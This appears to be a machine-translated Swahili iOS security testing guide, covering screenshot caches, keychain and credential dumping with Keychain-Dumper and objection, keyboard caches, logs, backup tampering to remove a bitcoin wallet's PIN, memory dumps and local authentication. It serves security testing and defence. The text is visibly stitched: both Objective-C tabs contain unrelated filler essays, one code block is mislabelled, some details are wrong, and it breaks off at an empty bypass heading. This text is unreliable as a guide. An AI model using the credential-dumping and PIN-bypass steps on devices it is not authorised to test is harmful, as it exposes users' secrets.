Kila wakati unapobonyeza kitufe cha nyumbani, iOS **inachukua picha ya skrini ya sasa** ili kuweza kufanya mpito kwenye programu kwa njia laini zaidi. Walakini, ikiwa **data nyeti** ipo kwenye skrini ya sasa, itahifadhiwa kwenye **picha** (ambayo **inadumu** **hata** **baada** **ya** **kuzima** **kifaa**). Hizi ni picha za skrini ambazo pia unaweza kuzifikia kwa kubonyeza mara mbili skrini ya nyumbani ili kubadili programu.

Isipokuwa iPhone imefungwa, **mshambuliaji** anahitaji kuwa na **upatikanaji** wa **kifaa** **bila** **kizuizi** ili kuona picha hizi za skrini. Kwa chaguo-msingi, picha ya skrini ya mwisho inahifadhiwa kwenye sanduku la programu katika saraka ya `Library/Caches/Snapshots/` au saraka ya `Library/SplashBoard/Snapshots` (kompyuta za kuaminika haziwezi kupata mfumo wa faili kutoka iOX 7.0).

Njia moja ya kuzuia tabia mbaya hii ni kuweka skrini tupu au kuondoa data nyeti kabla ya kuchukua picha ya skrini kwa kutumia kazi ya `ApplicationDidEnterBackground()`.

Ifuatayo ni mfano wa njia ya kurekebisha ambayo itaweka picha ya skrini ya msingi.

Swift:
```swift
private var backgroundImage: UIImageView?

func applicationDidEnterBackground(_ application: UIApplication) {
let myBanner = UIImageView(image: #imageLiteral(resourceName: "overlayImage"))
myBanner.frame = UIScreen.main.bounds
backgroundImage = myBanner
window?.addSubview(myBanner)
}

func applicationWillEnterForeground(_ application: UIApplication) {
backgroundImage?.removeFromSuperview()
}
```
Objective-C:

Objective-C ni lugha ya programu ambayo hutumiwa kwa maendeleo ya programu za iOS. Ni lugha ya programu ya darasa la juu ambayo inaunganisha utendaji wa lugha ya C na uwezo wa kufanya kazi na vitu vya darasa. Lugha hii inatumika sana katika maendeleo ya programu za iOS na hutumiwa kwa kujenga programu za rununu, programu za kompyuta, na programu za wavuti.
```
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
self.backgroundImage = myBanner;
self.backgroundImage.bounds = UIScreen.mainScreen.bounds;
[self.window addSubview:myBanner];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
[self.backgroundImage removeFromSuperview];
}
```
Hii inaweka picha ya mandharinyuma kuwa `overlayImage.png` wakati wowote programu inapokuwa katika hali ya mandharinyuma. Inazuia uvujaji wa data nyeti kwa sababu `overlayImage.png` itachukua nafasi ya mandharinyuma ya sasa.

### Keychain

Kwa kupata na kusimamia keychain ya iOS, zana kama [**Keychain-Dumper**](https://github.com/ptoomey3/Keychain-Dumper) zinapatikana, zinazofaa kwa vifaa vilivyofungwa. Kwa kuongezea, [**Objection**](https://github.com/sensepost/objection) inatoa amri `ios keychain dump` kwa madhumuni kama hayo.

#### **Kuhifadhi Vitambulisho**

Darasa la **NSURLCredential** ni bora kwa kuhifadhi habari nyeti moja kwa moja katika keychain, ikiepuka hitaji la NSUserDefaults au vifuniko vingine. Kuhifadhi vitambulisho baada ya kuingia, nambari ifuatayo ya Swift hutumiwa:
```swift
NSURLCredential *credential;
credential = [NSURLCredential credentialWithUser:username password:password persistence:NSURLCredentialPersistencePermanent];
[[NSURLCredentialStorage sharedCredentialStorage] setCredential:credential forProtectionSpace:self.loginProtectionSpace];
```
Kuondoa siri hizi zilizohifadhiwa, amri ya Objection `ios nsurlcredentialstorage dump` hutumiwa.

## **Vidhibiti vya Kibodi na Hifadhi ya Kibodi**

Kuanzia iOS 8.0 kuendelea, watumiaji wanaweza kusakinisha nyongeza za vidhibiti vya kibodi za kawaida, ambazo zinaweza kusimamiwa chini ya **Mipangilio > Kuu > Kibodi > Vidhibiti vya Kibodi**. Ingawa vidhibiti hivi vya kibodi hutoa utendaji uliopanuliwa, vinaweka hatari ya kurekodi taratibu za kubonyeza na kutuma data kwenye seva za nje, ingawa watumiaji huarifiwa kuhusu vidhibiti vya kibodi vinavyohitaji ufikiaji wa mtandao. Programu zinaweza, na zinapaswa, kuzuia matumizi ya vidhibiti vya kibodi za kawaida kwa kuingiza habari nyeti.

**Mapendekezo ya Usalama:**
- Inashauriwa kuzima vidhibiti vya kibodi za watu wa tatu kwa usalama ulioimarishwa.
- Jua kuhusu vipengele vya kurekebisha moja kwa moja na mapendekezo ya moja kwa moja ya kibodi ya iOS ya msingi, ambayo inaweza kuhifadhi habari nyeti katika faili za hifadhi zilizoko `Library/Keyboard/{eneo}-dynamic-text.dat` au `/private/var/mobile/Library/Keyboard/dynamic-text.dat`. Faili hizi za hifadhi zinapaswa kuchunguzwa mara kwa mara kwa data nyeti. Kurejesha kamusi ya kibodi kupitia **Mipangilio > Kuu > Rudisha > Rudisha Kamusi ya Kibodi** kunapendekezwa ili kufuta data iliyohifadhiwa.
- Kukamata trafiki ya mtandao kunaweza kufunua ikiwa kibodi ya kawaida inatuma taratibu za kubonyeza mbali.

### **Kuzuia Hifadhi ya Sehemu ya Maandishi**

Itifaki ya [UITextInputTraits](https://developer.apple.com/reference/uikit/uitextinputtraits) inatoa mali za kusimamia kurekebisha moja kwa moja na kuingiza maandishi salama, ambayo ni muhimu kwa kuzuia hifadhi ya habari nyeti. Kwa mfano, kuzima kurekebisha moja kwa moja na kuwezesha kuingiza maandishi salama kunaweza kufanikishwa na:
```objectivec
textObject.autocorrectionType = UITextAutocorrectionTypeNo;
textObject.secureTextEntry = YES;
```
Kwa kuongezea, waendelezaji wanapaswa kuhakikisha kuwa maeneo ya maandishi, hasa yale yanayotumiwa kuingiza habari nyeti kama nywila na PIN, yanalemaza uwezo wa kuhifadhi kwa kuweka `autocorrectionType` kuwa `UITextAutocorrectionTypeNo` na `secureTextEntry` kuwa `YES`.
```objectivec
UITextField *textField = [[UITextField alloc] initWithFrame:frame];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
```
## **Kumbukumbu**

Kutatua matatizo ya programu mara nyingi kunahusisha matumizi ya **kumbukumbu**. Kuna hatari kwani **kumbukumbu inaweza kuwa na habari nyeti**. Awali, katika iOS 6 na toleo zingine za awali, kumbukumbu zilikuwa zinapatikana kwa programu zote, hivyo kuhatarisha uvujaji wa data nyeti. **Sasa, programu zimezuiliwa kufikia kumbukumbu zao tu**.

Licha ya vizuizi hivi, **mshambuliaji mwenye ufikiaji wa kimwili** kwenye kifaa kilichofunguliwa bado anaweza kutumia hili kwa kuunganisha kifaa kwenye kompyuta na **kusoma kumbukumbu**. Ni muhimu kufahamu kwamba kumbukumbu zinabaki kwenye diski hata baada ya programu kuondolewa.

Ili kupunguza hatari, ni vyema **kuingiliana kikamilifu na programu**, kuchunguza kazi zake zote na kuingiza data ili kuhakikisha hakuna habari nyeti inayorekodiwa kwa bahati mbaya.

Wakati wa kukagua nambari ya chanzo ya programu kwa uvujaji wa data, tafuta **taarifa za kumbukumbu zilizowekwa tayari** na **taarifa za kumbukumbu za desturi** kwa kutumia maneno kama `NSLog`, `NSAssert`, `NSCAssert`, `fprintf` kwa kazi zilizojengwa, na pia kumbukumbu za `Logging` au `Logfile` kwa utekelezaji wa desturi.

### **Kufuatilia Kumbukumbu za Mfumo**

Programu hurekodi vipande mbalimbali vya habari ambavyo vinaweza kuwa nyeti. Ili kufuatilia kumbukumbu hizi, zana na amri kama:
```bash
idevice_id --list   # To find the device ID
idevicesyslog -u <id> (| grep <app>)   # To capture the device logs
```
yanafaa. Zaidi ya hayo, **Xcode** inatoa njia ya kukusanya kumbukumbu za konsoli:

1. Fungua Xcode.
2. Unganisha kifaa cha iOS.
3. Nenda kwenye **Window** -> **Devices and Simulators**.
4. Chagua kifaa chako.
5. Chokoza tatizo unalochunguza.
6. Tumia kitufe cha **Open Console** kuona kumbukumbu kwenye dirisha jipya.

Kwa kumbukumbu za juu zaidi, kuunganisha kwenye kabati la kifaa na kutumia **socat** kunaweza kutoa ufuatiliaji wa kumbukumbu halisi kwa wakati halisi:
```bash
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock
```
Kufuatia amri za kuangalia shughuli za kumbukumbu, ambazo zinaweza kuwa muhimu katika kutambua matatizo au kutambua uvujaji wa data unaowezekana katika kumbukumbu.

***

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na kutekeleza kwa urahisi **mchakato wa kazi** ulioendeshwa na zana za jamii za **juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Nakala za Hifadhi

**Vipengele vya nakala za hifadhi otomatiki** vimejumuishwa katika iOS, kurahisisha uundaji wa nakala za data za kifaa kupitia iTunes (hadi macOS Catalina), Finder (kuanzia macOS Catalina), au iCloud. Nakala hizi za hifadhi zinajumuisha karibu data yote ya kifaa, isipokuwa vipengele vyenye hisia kubwa kama maelezo ya Apple Pay na mipangilio ya Touch ID.

### Hatari za Usalama

Kuwekwa kwa **programu zilizosakinishwa na data zao** katika nakala za hifadhi kunasababisha suala la **uvujaji wa data** unaowezekana na hatari kwamba **marekebisho ya nakala za hifadhi yanaweza kubadilisha utendaji wa programu**. Inashauriwa **kutoweka habari nyeti kwa maandishi wazi** ndani ya saraka yoyote ya programu au saraka zake za ndani ili kupunguza hatari hizi.

### Kutojumuisha Faili katika Nakala za Hifadhi

Faili katika `Documents/` na `Library/Application Support/` zinahifadhiwa kwa chaguo-msingi. Watengenezaji wanaweza kutojumuisha faili au saraka maalum katika nakala za hifadhi kwa kutumia `NSURL setResourceValue:forKey:error:` na `NSURLIsExcludedFromBackupKey`. Mazoezi haya ni muhimu kwa kulinda data nyeti isijumuishwe katika nakala za hifadhi.

### Kufanya Majaribio ya Udhaifu

Ili kutathmini usalama wa nakala za hifadhi ya programu, anza kwa **kuunda nakala ya hifadhi** kwa kutumia Finder, kisha ipate kwa kufuata mwongozo kutoka [nyaraka rasmi za Apple](https://support.apple.com/en-us/HT204215). Chambua nakala ya hifadhi kwa data nyeti au mipangilio ambayo inaweza kubadilishwa ili kuathiri tabia ya programu.

Taarifa nyeti inaweza kutafutwa kwa kutumia zana za amri ya mstari au programu kama [iMazing](https://imazing.com). Kwa nakala za hifadhi zilizofichwa, uwepo wa kificho cha siri unaweza kuthibitishwa kwa kuangalia ufunguo wa "IsEncrypted" katika faili ya "Manifest.plist" katika mzizi wa nakala ya hifadhi.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...
<key>Date</key>
<date>2021-03-12T17:43:33Z</date>
<key>IsEncrypted</key>
<true/>
...
</plist>
```
Kwa kushughulikia nakala za nakala zilizofichwa, hati za Python zinapatikana katika [repo ya GitHub ya DinoSec](https://github.com/dinosec/iphone-dataprotection/tree/master/python_scripts), kama vile **backup_tool.py** na **backup_passwd.py**, inaweza kuwa na manufaa, ingawa inaweza kuhitaji marekebisho kwa utangamano na toleo jipya la iTunes/Finder. [Zana ya **iOSbackup**](https://pypi.org/project/iOSbackup/) ni chaguo lingine kwa kupata faili ndani ya nakala za nakala zilizolindwa kwa nenosiri.

### Kubadilisha Tabia ya Programu

Mfano wa kubadilisha tabia ya programu kupitia marekebisho ya nakala za nakala zinaonyeshwa katika programu ya mkoba wa bitcoin ya [Bither](https://github.com/bither/bither-ios), ambapo PIN ya kufunga UI imehifadhiwa ndani ya `net.bither.plist` chini ya ufunguo wa **pin_code**. Kuondoa ufunguo huu kutoka kwa plist na kurejesha nakala ya nakala kunasababisha kuondolewa kwa mahitaji ya PIN, ikitoa ufikiaji usiozuiliwa.

## Muhtasari juu ya Jaribio la Kumbukumbu kwa Data Nyeti

Wakati unashughulika na habari nyeti iliyohifadhiwa katika kumbukumbu ya programu, ni muhimu kupunguza muda wa kufichua data hii. Kuna njia mbili kuu za kuchunguza maudhui ya kumbukumbu: **kuunda nakala ya kumbukumbu** na **uchambuzi wa kumbukumbu kwa wakati halisi**. Njia zote mbili zina changamoto zao, ikiwa ni pamoja na uwezekano wa kukosa data muhimu wakati wa mchakato wa nakala au uchambuzi.

## **Kupata na Kuchambua Nakala ya Kumbukumbu**

Kwa vifaa vilivyofunguliwa na visivyofunguliwa, zana kama [objection](https://github.com/sensepost/objection) na [Fridump](https://github.com/Nightbringer21/fridump) huruhusu kufanya nakala ya kumbukumbu ya mchakato wa programu. Mara baada ya kufanywa nakala, kuchambua data hii kunahitaji zana mbalimbali, kulingana na asili ya habari unayotafuta.

Kutolewa kwa herufi kutoka kwa nakala ya kumbukumbu, amri kama vile `strings` au `rabin2 -zz` zinaweza kutumika:
```bash
# Extracting strings using strings command
$ strings memory > strings.txt

# Extracting strings using rabin2
$ rabin2 -ZZ memory > strings.txt
```
Kwa uchambuzi uliozingatia zaidi, ikiwa ni pamoja na kutafuta aina maalum za data au mifano, **radare2** inatoa uwezo mkubwa wa kutafuta:
```bash
$ r2 <name_of_your_dump_file>
[0x00000000]> /?
...
```
## **Uchambuzi wa Kumbukumbu ya Muda wa Uendeshaji**

**r2frida** hutoa mbadala yenye nguvu kwa ajili ya kuchunguza kumbukumbu ya programu katika muda halisi, bila kuhitaji kumbukumbu ya muda. Zana hii inawezesha utekelezaji wa amri za utafutaji moja kwa moja kwenye kumbukumbu ya programu inayoendelea:
```bash
$ r2 frida://usb//<name_of_your_app>
[0x00000000]> /\ <search_command>
```
## Uvunjaji wa Kriptografia

### Mchakato Mbaya wa Usimamizi wa Funguo

Baadhi ya watengenezaji huhifadhi data nyeti kwenye uhifadhi wa ndani na kuiweka kwenye kificho na funguo zilizowekwa/kutabirika. Hii haipaswi kufanywa kwani baadhi ya ugeuzaji wa kificho unaweza kuruhusu wadukuzi kuchukua taarifa za siri.

### Matumizi ya Algorithm Zisizo Salama na/au Zilizopitwa na Wakati

Watengenezaji hawapaswi kutumia **algorithm zilizopitwa na wakati** kufanya **uthibitisho**, **kuhifadhi**, au **kupeleka** data. Baadhi ya algorithm hizi ni: RC4, MD4, MD5, SHA1... Ikiwa **hash** zinatumika kuhifadhi nywila kwa mfano, ni vyema kutumia hash zinazopingana na jaribio la nguvu na chumvi.

### Ukaguzi

Ukaguzi muhimu wa kufanya ni kutafuta ikiwa unaweza kupata nywila/siri zilizowekwa kwenye kificho, au ikiwa hizo ni **zilizotabirika**, na ikiwa kificho kinatumia aina fulani ya algorithm ya **kriptografia** **dhaifu**.

Ni muhimu kujua kwamba unaweza **kufuatilia** maktaba fulani za **kriptografia** kiotomatiki kwa kutumia **objection** na:
```swift
ios monitor crypt
```
Kwa **mashauri zaidi** kuhusu APIs na maktaba za kriptografia za iOS tembelea [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography)

## Uthibitishaji wa Ndani

**Uthibitishaji wa ndani** unacheza jukumu muhimu, hasa linapohusiana na kulinda ufikiaji kwenye kifaa cha mbali kupitia njia za kriptografia. Hapa, muhimu ni kwamba bila utekelezaji sahihi, mifumo ya uthibitishaji wa ndani inaweza kuzungukwa.

**[Itifaki ya Uthibitishaji wa Ndani](https://developer.apple.com/documentation/localauthentication)** ya Apple na **[keychain](https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html)** hutoa APIs imara kwa watengenezaji ili kurahisisha mazungumzo ya uthibitishaji wa mtumiaji na kushughulikia kwa usalama data za siri, mtawalia. Enclave Salama inalinda kitambulisho cha kidole kwa Touch ID, wakati Face ID inategemea utambuzi wa uso bila kuhatarisha data ya biometriki.

Kuunganisha Touch ID/Face ID, watengenezaji wana chaguo mbili za API:
- **`LocalAuthentication.framework`** kwa uthibitishaji wa mtumiaji wa kiwango cha juu bila ufikiaji wa data ya biometriki.
- **`Security.framework`** kwa ufikiaji wa huduma za keychain za kiwango cha chini, kwa kuhifadhi data za siri kwa uthibitishaji wa biometriki. Vifuniko vya chanzo wazi mbalimbali hufanya ufikiaji wa keychain kuwa rahisi. 

{% hint style="danger" %}
Hata hivyo, `LocalAuthentication.framework` na `Security.framework` zote zinaleta udhaifu, kwani kimsingi zinarudisha thamani za boolean bila kuhamisha data kwa mchakato wa uthibitishaji, hivyo zinaweza kuzungukwa (rejea [Usiniguse kwa njia hiyo, na David Lindner et al](https://www.youtube.com/watch?v=XhXIHVGCFFM)).
{% endhint %}

### Kuweka Uthibitishaji wa Ndani

Ili kuomba uthibitishaji kwa watumiaji, watengenezaji wanapaswa kutumia njia ya **`evaluatePolicy`** ndani ya darasa la **`LAContext`**, wakichagua kati ya:
- **`deviceOwnerAuthentication`**: Inaomba Touch ID au nambari ya kifaa, ikishindwa ikiwa hakuna moja imezimwa.
- **`deviceOwnerAuthenticationWithBiometrics`**: Inaomba pekee Touch ID.

Uthibitishaji uliofanikiwa unadhihirishwa na thamani ya boolean inayorudi kutoka **`evaluatePolicy`**, ikionyesha kasoro ya usalama inayowezekana.

### Uthibitishaji wa Ndani kwa Kutumia Keychain

Kutekeleza **uthibitishaji wa ndani** kwenye programu za iOS kunahusisha matumizi ya **keychain APIs** kuhifadhi data za siri kama vile vibali vya uthibitishaji. Mchakato huu unahakikisha kuwa data inaweza kupatikana tu na mtumiaji, kwa kutumia nambari ya kifaa chao au uthibitishaji wa biometriki kama vile Touch ID.

Keychain inatoa uwezo wa kuweka vitu na sifa ya `SecAccessControl`, ambayo inazuia ufikiaji wa kipengee hadi mtumiaji athibitishe kwa mafanikio kupitia Touch ID au nambari ya kifaa. Kipengele hiki ni muhimu kwa kuimarisha usalama.

Hapa chini ni mifano ya nambari katika Swift na Objective-C inayoonyesha jinsi ya kuhifadhi na kupata herufi kutoka kwenye keychain, kwa kutumia vipengele hivi vya usalama. Mifano inaonyesha hasa jinsi ya kuweka udhibiti wa ufikiaji ili kuhitaji uthibitishaji wa Touch ID na kuhakikisha data inapatikana tu kwenye kifaa ambacho ilianzishwa, chini ya hali kwamba nambari ya kifaa imeundwa.

{% tabs %}
{% tab title="Swift" %}
```swift
// From https://github.com/mufambisi/owasp-mstg/blob/master/Document/0x06f-Testing-Local-Authentication.md

// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
SecAccessControlCreateFlags.biometryCurrentSet,
&error) else {
// failed to create AccessControl object

return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}

{% tab title="Objective-C" %}Lugha ya Objective-C ni lugha ya programu inayotumiwa sana katika maendeleo ya programu za iOS. Inaunganisha utendaji wa lugha ya C na vipengele vya kawaida vya programu za iOS. Kwa hivyo, kujifunza Objective-C ni muhimu sana kwa wapenzi wa ujasusi wa iOS.

Hapa kuna baadhi ya mambo muhimu ya kuzingatia wakati wa kufanya ukaguzi wa usalama wa programu za iOS zilizoandikwa kwa kutumia Objective-C:

- **Kuchunguza Mipangilio ya Usalama**: Angalia mipangilio ya usalama kwenye faili ya Info.plist ya programu ili kuhakikisha kuwa mipangilio muhimu ya usalama imeanzishwa vizuri.
- **Kuchunguza Udhibiti wa Udhibiti**: Angalia jinsi programu inavyoshughulikia udhibiti wa udhibiti, kama vile kuzuia skrini, kuzuia kuchapisha, na kuzuia kuchapisha.
- **Kuchunguza Udhibiti wa Upatikanaji**: Angalia jinsi programu inavyoshughulikia udhibiti wa upatikanaji, kama vile udhibiti wa ufikiaji wa faili na udhibiti wa ufikiaji wa kamera.
- **Kuchunguza Udhibiti wa Kitambulisho**: Angalia jinsi programu inavyoshughulikia udhibiti wa kitambulisho, kama vile udhibiti wa kitambulisho cha kifaa na udhibiti wa kitambulisho cha mtumiaji.
- **Kuchunguza Udhibiti wa Mawasiliano**: Angalia jinsi programu inavyoshughulikia udhibiti wa mawasiliano, kama vile udhibiti wa mtandao na udhibiti wa Bluetooth.
- **Kuchunguza Udhibiti wa Data**: Angalia jinsi programu inavyoshughulikia udhibiti wa data, kama vile udhibiti wa kuhifadhi data na udhibiti wa uhamishaji wa data.
- **Kuchunguza Udhibiti wa Usalama**: Angalia jinsi programu inavyoshughulikia udhibiti wa usalama, kama vile udhibiti wa ufikiaji wa kumbukumbu na udhibiti wa ufikiaji wa kifaa.
- **Kuchunguza Udhibiti wa Uthibitishaji**: Angalia jinsi programu inavyoshughulikia udhibiti wa uthibitishaji, kama vile udhibiti wa uthibitishaji wa mtumiaji na udhibiti wa uthibitishaji wa kifaa.
- **Kuchunguza Udhibiti wa Malipo**: Angalia jinsi programu inavyoshughulikia udhibiti wa malipo, kama vile udhibiti wa manunuzi ya ndani na udhibiti wa manunuzi ya nje.
- **Kuchunguza Udhibiti wa Ufuatiliaji**: Angalia jinsi programu inavyoshughulikia udhibiti wa ufuatiliaji, kama vile udhibiti wa ufuatiliaji wa matukio na udhibiti wa ufuatiliaji wa vitendo.

Kwa kuzingatia mambo haya, unaweza kufanya ukaguzi wa usalama wa kina wa programu za iOS zilizoandikwa kwa kutumia Objective-C na kugundua kasoro za usalama ambazo zinaweza kusababisha uvujaji wa data au mashambulizi mengine ya kiusalama.
```objectivec
// 1. create AccessControl object that will represent authentication settings
CFErrorRef *err = nil;

SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
kSecAccessControlUserPresence,
err);

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
NSDictionary* query = @{
(_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecAttrAccount: @"OWASP Account",
(__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
(__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
};

// 3. save item
OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

if (status == noErr) {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}
{% endtabs %}

Sasa tunaweza kuomba kipengee kilichohifadhiwa kutoka kwa keychain. Huduma za keychain zitawasilisha dirisha la uwakilishi kwa mtumiaji na kurudisha data au nil kulingana na ikiwa alama ya vidole inayofaa ilitolewa au la.
```swift
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
let password = String(data: queryResult as! Data, encoding: .utf8)!
// successfully received password
} else {
// authorization not passed
}
```
{% endtab %}

{% tab title="Objective-C" %}Lengo la sehemu hii ni kukupa mwongozo wa kuanza na upimaji wa usalama wa programu za iOS. Itakusaidia kuelewa mchakato wa upimaji wa usalama wa programu za iOS na kujifunza mbinu za kawaida za upimaji wa usalama wa programu za iOS.

### Mazingira ya Upimaji wa Usalama wa iOS

Kabla ya kuanza na upimaji wa usalama wa programu za iOS, unahitaji kuwa na mazingira sahihi ya upimaji. Hapa kuna mambo muhimu ya kuzingatia:

1. **Jailbroken Device**: Kwa upimaji wa kina wa usalama wa programu za iOS, unahitaji kifaa kilichofunguliwa (jailbroken). Hii itakuruhusu kupata ufikiaji wa kiwango cha chini cha mfumo wa uendeshaji wa iOS na kufanya uchunguzi wa kina wa programu.

2. **iOS Simulator**: Ikiwa huna kifaa kilichofunguliwa, unaweza kutumia iOS Simulator kwa upimaji wa msingi wa usalama. Simulator inakuwezesha kuendesha programu za iOS kwenye kompyuta yako na kufanya uchunguzi wa msingi wa usalama.

3. **Xcode**: Xcode ni mazingira ya maendeleo ya programu ya Apple ambayo inakuwezesha kuunda, kusanidi, na kuchunguza programu za iOS. Unahitaji kuwa na Xcode imewekwa kwenye mfumo wako ili uweze kufanya upimaji wa usalama wa programu za iOS.

### Mbinu za Upimaji wa Usalama wa iOS

Baada ya kuwa na mazingira sahihi ya upimaji, unaweza kuanza kufanya upimaji wa usalama wa programu za iOS. Hapa kuna mbinu za kawaida za upimaji wa usalama wa programu za iOS:

1. **Static Analysis**: Hii ni mbinu ya upimaji wa usalama ambayo inahusisha uchambuzi wa programu bila kuiendesha. Unachunguza faili za programu, kanuni, na rasilimali ili kutambua kasoro za usalama na udhaifu.

2. **Dynamic Analysis**: Hii ni mbinu ya upimaji wa usalama ambayo inahusisha uchambuzi wa programu wakati inaendeshwa. Unachunguza tabia ya programu, mwingiliano na rasilimali za mfumo ili kutambua kasoro za usalama na udhaifu.

3. **Network Analysis**: Hii ni mbinu ya upimaji wa usalama ambayo inahusisha uchunguzi wa mawasiliano ya mtandao yanayohusiana na programu. Unachunguza trafiki ya mtandao, mawasiliano ya API, na mwingiliano wa mtandao ili kutambua kasoro za usalama na udhaifu.

4. **Reverse Engineering**: Hii ni mbinu ya upimaji wa usalama ambayo inahusisha kuchambua programu ili kuelewa jinsi inavyofanya kazi na kutambua kasoro za usalama. Unachunguza kanuni ya programu, faili za kutekelezwa, na mwingiliano wa mfumo ili kutambua udhaifu na kasoro za usalama.

### Zana za Upimaji wa Usalama wa iOS

Kuna zana nyingi zinazopatikana kwa upimaji wa usalama wa programu za iOS. Hapa kuna baadhi ya zana maarufu:

1. **Frida**: Hii ni zana ya upimaji wa usalama ambayo inaruhusu kuingilia kati na kuchunguza programu za iOS wakati wa kutekelezwa. Inakuwezesha kubadilisha tabia ya programu, kuchunguza mwingiliano wa mfumo, na kutambua kasoro za usalama.

2. **Cycript**: Hii ni zana ya upimaji wa usalama ambayo inaruhusu kuingilia kati na kuchunguza programu za iOS wakati wa kutekelezwa. Inakuwezesha kuchunguza na kubadilisha tabia ya programu, kufanya majaribio ya kiotomatiki, na kutambua kasoro za usalama.

3. **MobSF**: Hii ni jukwaa la upimaji wa usalama ambalo linasaidia upimaji wa usalama wa programu za iOS. Inakuwezesha kufanya uchambuzi wa static na dynamic, kuchunguza kasoro za usalama, na kutoa ripoti za kina za upimaji.

### Vidokezo vya Upimaji wa Usalama wa iOS

Hapa kuna vidokezo vichache vya kuzingatia wakati wa kufanya upimaji wa usalama wa programu za iOS:

1. **Kagua Kanuni**: Angalia kanuni ya programu kwa makini ili kutambua kasoro za usalama na udhaifu. Tafuta mifumo ya usalama iliyowekwa na uhakikishe kuwa kanuni inazingatia viwango vya usalama.

2. **Fanya Uchunguzi wa Kina**: Fanya uchunguzi wa kina wa programu ili kutambua kasoro za usalama na udhaifu. Chambua faili za programu, mwingiliano wa mfumo, na mawasiliano ya mtandao ili kugundua kasoro za usalama.

3. **Tumia Zana za Upimaji**: Tumia zana za upimaji wa usalama kama Frida, Cycript, na MobSF kusaidia katika uchambuzi wa programu na kutambua kasoro za usalama.

4. **Fanya Majaribio ya Kiotomatiki**: Tumia majaribio ya kiotomatiki kuchunguza programu kwa kasoro za usalama. Fanya majaribio ya kuingilia kati, majaribio ya mwingiliano wa mtandao, na majaribio mengine ya usalama ili kugundua udhaifu.

### Hitimisho

Upimaji wa usalama wa programu za iOS ni mchakato muhimu katika kuhakikisha usalama wa programu. Kwa kufuata mbinu sahihi za upimaji na kutumia zana sahihi, unaweza kutambua kasoro za usalama na kuchukua hatua za kurekebisha. Kumbuka kufanya upimaji wa usalama kwa idhini na kufuata sheria na kanuni zinazohusiana.
```objectivec
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecAttrAccount: @"My Name1",
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
NSData* resultData = ( __bridge_transfer NSData* )queryResult;
NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
NSLog(@"%@", password);
} else {
NSLog(@"Something went wrong");
}
```
{% endtab %}
{% endtabs %}

### Uchunguzi

Matumizi ya fremu katika programu pia yanaweza kugunduliwa kwa kuchambua orodha ya maktaba za kushirikiana za kibayoteki za programu. Hii inaweza kufanywa kwa kutumia `otool`:
```bash
$ otool -L <AppName>.app/<AppName>
```
Ikiwa `LocalAuthentication.framework` inatumika katika programu, matokeo yatakuwa na mistari yote mawili ifuatayo (kumbuka kuwa `LocalAuthentication.framework` inatumia `Security.framework` kwa nyuma):
```bash
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
```
Ikiwa `Security.framework` inatumika, itaonyeshwa tu ya pili.

### Kudukua Kitengo cha Uthibitishaji wa Ndani

#### **Objection**

